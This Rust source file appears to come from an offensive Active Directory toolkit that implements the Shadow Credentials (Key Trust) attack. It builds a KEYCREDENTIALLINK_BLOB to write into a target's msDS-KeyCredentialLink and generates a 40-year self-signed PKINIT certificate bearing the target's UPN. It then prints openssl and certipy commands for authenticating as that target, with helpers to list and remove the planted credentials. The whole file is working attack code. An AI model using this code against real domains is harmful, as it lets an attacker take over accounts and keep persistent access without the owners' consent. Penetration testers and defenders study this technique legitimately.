//! Shadow Credentials (Key Trust) payload building and parsing, shared by the
//! LDAP and ADWS actions. Only the `msDS-KeyCredentialLink` read/modify is
//! transport-specific; everything here (the KEYCREDENTIALLINK_BLOB, the
//! self-signed PKINIT certificate, parsing and display) is transport-agnostic.
//!
//! References:
//!   [MS-ADTS] 2.2.20 KEYCREDENTIALLINK_BLOB / 2.2.20.6 entry identifiers
//!   https://github.com/eladshamir/Whisker, https://github.com/ShutdownRepo/pywhisker

use std::time::{SystemTime, UNIX_EPOCH};

use anyhow::{Context, Result};
use log::{debug, trace};
use rand::RngCore;
use rsa::pkcs8::EncodePrivateKey;
use rsa::traits::PublicKeyParts;
use sha2::{Digest, Sha256};

use crate::shlog;

/// [MS-ADTS] attribute holding the Key Trust credentials.
pub const KEYCRED_ATTR: &str = "msDS-KeyCredentialLink";

// KEYCREDENTIALLINK_ENTRY identifiers ([MS-ADTS] 2.2.20.6)
const ID_KEY_ID: u8 = 0x01;
const ID_KEY_HASH: u8 = 0x02;
const ID_KEY_MATERIAL: u8 = 0x03;
const ID_KEY_USAGE: u8 = 0x04;
const ID_KEY_SOURCE: u8 = 0x05;
const ID_DEVICE_ID: u8 = 0x06;
const ID_CUSTOM_KEY_INFO: u8 = 0x07;
const ID_KEY_CREATION_TIME: u8 = 0x09;

const KEY_USAGE_NGC: u8 = 0x01;
const KEY_SOURCE_AD: u8 = 0x00;

/// Everything `add_shadow_cred` needs after generation.
pub struct ShadowCredMaterial {
    /// DNWithBinary value to write into `msDS-KeyCredentialLink`.
    pub value: String,
    /// User-visible DeviceID (16-byte GUID).
    pub device_id: [u8; 16],
    /// Self-signed certificate (PEM) for PKINIT.
    pub crt_pem: String,
    /// Matching private key (PKCS#8 PEM).
    pub key_pem: String,
}

/// Parsed subset of a KEYCREDENTIALLINK entry used by list/remove.
pub struct KeyCredInfo {
    pub device_id: [u8; 16],
    pub creation_time: u64,
}

fn kc_entry(id: u8, data: &[u8]) -> Vec<u8> {
    let mut e = Vec::with_capacity(3 + data.len());
    e.extend_from_slice(&(data.len() as u16).to_le_bytes());
    e.push(id);
    e.extend_from_slice(data);
    e
}

fn now_filetime() -> [u8; 8] {
    let secs = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs();
    let filetime: u64 = (secs + 11_644_473_600) * 10_000_000;
    filetime.to_le_bytes()
}

fn bcrypt_rsa_public_blob(pub_key: &rsa::RsaPublicKey) -> Vec<u8> {
    let n = pub_key.n().to_bytes_be();
    let e = pub_key.e().to_bytes_be();
    let bit_len = (n.len() * 8) as u32;
    let mut blob = Vec::with_capacity(24 + e.len() + n.len());
    blob.extend_from_slice(b"RSA1");
    blob.extend_from_slice(&bit_len.to_le_bytes());
    blob.extend_from_slice(&(e.len() as u32).to_le_bytes());
    blob.extend_from_slice(&(n.len() as u32).to_le_bytes());
    blob.extend_from_slice(&0u32.to_le_bytes());
    blob.extend_from_slice(&0u32.to_le_bytes());
    blob.extend_from_slice(&e);
    blob.extend_from_slice(&n);
    blob
}

fn build_blob(key_material: &[u8], device_id: &[u8; 16]) -> Vec<u8> {
    let key_id = Sha256::digest(key_material);
    let creation = now_filetime();

    let mut tail: Vec<u8> = Vec::new();
    tail.extend(kc_entry(ID_KEY_MATERIAL, key_material));
    tail.extend(kc_entry(ID_KEY_USAGE, &[KEY_USAGE_NGC]));
    tail.extend(kc_entry(ID_KEY_SOURCE, &[KEY_SOURCE_AD]));
    tail.extend(kc_entry(ID_DEVICE_ID, device_id));
    tail.extend(kc_entry(ID_CUSTOM_KEY_INFO, &[0x01, 0x00]));
    tail.extend(kc_entry(ID_KEY_CREATION_TIME, &creation));

    let key_hash = Sha256::digest(&tail);

    let mut blob: Vec<u8> = Vec::new();
    blob.extend_from_slice(&0x0000_0200u32.to_le_bytes());
    blob.extend(kc_entry(ID_KEY_ID, &key_id));
    blob.extend(kc_entry(ID_KEY_HASH, &key_hash));
    blob.extend(tail);
    blob
}

/// LDAP DNWithBinary syntax value: `B:<hex_char_count>:<lowercase_hex>:<dn>`.
fn dn_with_binary(blob: &[u8], dn: &str) -> String {
    let hex = hex::encode(blob);
    format!("B:{}:{}:{}", hex.len(), hex, dn)
}

/// Generate the RSA key, KEYCREDENTIALLINK_BLOB, DNWithBinary value, a random
/// DeviceID and a self-signed PKINIT certificate (PEM cert + key).
pub fn generate(target: &str, target_dn: &str, domain: &str) -> Result<ShadowCredMaterial> {
    debug!("[shadow_cred] generating RSA 2048 key pair");
    let private_key = rsa::RsaPrivateKey::new(&mut rand::thread_rng(), 2048)
        .context("RSA 2048 key generation failed")?;

    let key_material = bcrypt_rsa_public_blob(&private_key.to_public_key());

    let mut device_id = [0u8; 16];
    rand::thread_rng().fill_bytes(&mut device_id);
    debug!("[shadow_cred] DeviceID: {}", hex::encode(device_id));

    let blob = build_blob(&key_material, &device_id);
    let value = dn_with_binary(&blob, target_dn);
    trace!("[shadow_cred] DNWithBinary value len={}", value.len());

    // Self-signed cert carrying the same RSA key, with the UPN as an OtherName
    // SAN so the KDC can map the PKINIT request to the target.
    let pkcs8_pem = private_key
        .to_pkcs8_pem(rsa::pkcs8::LineEnding::LF)
        .context("RSA PKCS#8 PEM encoding failed")?;
    let key_pair = rcgen::KeyPair::from_pem(pkcs8_pem.as_str())
        .context("RSA key import into rcgen failed")?;

    let mut cert_params = rcgen::CertificateParams::default();
    cert_params.distinguished_name.push(rcgen::DnType::CommonName, target);

    const FORTY_YEARS_SECS: i64 = 40 * 365 * 86_400;
    let now = time::OffsetDateTime::now_utc();
    cert_params.not_before = now - time::Duration::seconds(FORTY_YEARS_SECS);
    cert_params.not_after = now + time::Duration::seconds(FORTY_YEARS_SECS);

    let upn = format!("{target}@{}", domain.to_lowercase());
    cert_params.subject_alt_names.push(rcgen::SanType::OtherName((
        vec![1u64, 3, 6, 1, 4, 1, 311, 20, 2, 3],
        rcgen::OtherNameValue::Utf8String(upn),
    )));

    let cert = cert_params
        .self_signed(&key_pair)
        .context("self-signed certificate generation failed")?;

    Ok(ShadowCredMaterial {
        value,
        device_id,
        crt_pem: cert.pem(),
        key_pem: key_pair.serialize_pem(),
    })
}

/// Write `<target>.crt` / `<target>.key` and print the PKINIT usage hints.
pub fn write_cert_files_and_hint(target: &str, domain: &str, m: &ShadowCredMaterial) -> Result<()> {
    let safe_name = target.to_lowercase().replace([' ', '\\', '/', '$'], "_");
    let crt_path = format!("{safe_name}.crt");
    let key_path = format!("{safe_name}.key");

    std::fs::write(&crt_path, &m.crt_pem).with_context(|| format!("writing {crt_path}"))?;
    std::fs::write(&key_path, &m.key_pem).with_context(|| format!("writing {key_path}"))?;

    shlog!("Certificate written to '{crt_path}'");
    shlog!("Private key  written to '{key_path}'");
    shlog!("Convert to PFX then authenticate:");
    shlog!("      openssl pkcs12 -export -in {crt_path} -inkey {key_path} -out {safe_name}.pfx -passout pass:");
    shlog!("      certipy auth -pfx {safe_name}.pfx -dc-ip <dc_ip> -domain {domain} -username {target}");
    shlog!("To clean up: remove_shadow_cred {target} {}", format_device_guid(&m.device_id));
    Ok(())
}

/// Print a parsed list of shadow credentials.
pub fn print_list(target: &str, values: &[String]) {
    if values.is_empty() {
        shlog!("No shadow credentials on '{target}'");
        return;
    }
    shlog!("{} shadow credential(s) on '{target}':", values.len());
    for (i, v) in values.iter().enumerate() {
        if let Some(kc) = parse_dnwithbinary(v) {
            shlog!(
                "    [{i}] DeviceID: {}  |  Created: {}",
                format_device_guid(&kc.device_id),
                filetime_to_utc(kc.creation_time)
            );
        } else {
            shlog!("    [{i}] (unparseable entry)");
        }
    }
}

pub fn parse_dnwithbinary(val: &str) -> Option<KeyCredInfo> {
    let parts: Vec<&str> = val.splitn(4, ':').collect();
    if parts.len() < 4 || parts[0] != "B" {
        return None;
    }
    let blob = hex::decode(parts[2]).ok()?;
    parse_blob_entries(&blob)
}

fn parse_blob_entries(blob: &[u8]) -> Option<KeyCredInfo> {
    if blob.len() < 4 {
        return None;
    }
    let mut pos = 4usize;
    let mut device_id = [0u8; 16];
    let mut creation_time = 0u64;
    while pos + 3 <= blob.len() {
        let data_len = u16::from_le_bytes([blob[pos], blob[pos + 1]]) as usize;
        let id = blob[pos + 2];
        pos += 3;
        if pos + data_len > blob.len() {
            break;
        }
        let data = &blob[pos..pos + data_len];
        match id {
            0x06 if data_len == 16 => device_id.copy_from_slice(data),
            0x09 if data_len == 8 => creation_time = u64::from_le_bytes(data.try_into().ok()?),
            _ => {}
        }
        pos += data_len;
    }
    Some(KeyCredInfo { device_id, creation_time })
}

fn filetime_to_utc(ft: u64) -> String {
    let unix_secs = ft / 10_000_000;
    if unix_secs < 11_644_473_600 {
        return "(invalid time)".to_string();
    }
    let secs = unix_secs - 11_644_473_600;
    let (y, mo, d) = days_to_ymd(secs / 86400);
    format!("{y:04}-{mo:02}-{d:02} {:02}:{:02}:{:02} UTC", (secs / 3600) % 24, (secs / 60) % 60, secs % 60)
}

fn days_to_ymd(mut days: u64) -> (u64, u64, u64) {
    let (n400, r) = (days / 146097, days % 146097);
    days = r;
    let (n100, r) = (days / 36524, days % 36524);
    let (n100, r) = if n100 == 4 { (3, 36524) } else { (n100, r) };
    days = r;
    let (n4, r) = (days / 1461, days % 1461);
    let (n1, r) = (r / 365, r % 365);
    let (n1, r) = if n1 == 4 { (3, 365) } else { (n1, r) };
    let year = n400 * 400 + n100 * 100 + n4 * 4 + n1 + 1970;
    let leap = year % 4 == 0 && (year % 100 != 0 || year % 400 == 0);
    let mdays: [u64; 12] = [31, if leap { 29 } else { 28 }, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
    let mut doy = r;
    let mut month = 1u64;
    for &md in &mdays {
        if doy < md {
            break;
        }
        doy -= md;
        month += 1;
    }
    (year, month, doy + 1)
}

pub fn format_device_guid(b: &[u8; 16]) -> String {
    format!(
        "{:02x}{:02x}{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}",
        b[3], b[2], b[1], b[0], b[5], b[4], b[7], b[6],
        b[8], b[9], b[10], b[11], b[12], b[13], b[14], b[15]
    )
}

pub fn parse_device_guid(s: &str) -> Option<[u8; 16]> {
    let s = s.trim().trim_matches(|c| c == '{' || c == '}');
    let clean: String = s.chars().filter(|c| *c != '-').collect();
    if clean.len() != 32 {
        return None;
    }
    let raw: Vec<u8> = (0..16)
        .map(|i| u8::from_str_radix(&clean[i * 2..i * 2 + 2], 16).ok())
        .collect::<Option<_>>()?;
    let mut out = [0u8; 16];
    out[0] = raw[3];
    out[1] = raw[2];
    out[2] = raw[1];
    out[3] = raw[0];
    out[4] = raw[5];
    out[5] = raw[4];
    out[6] = raw[7];
    out[7] = raw[6];
    out[8..].copy_from_slice(&raw[8..]);
    Some(out)
}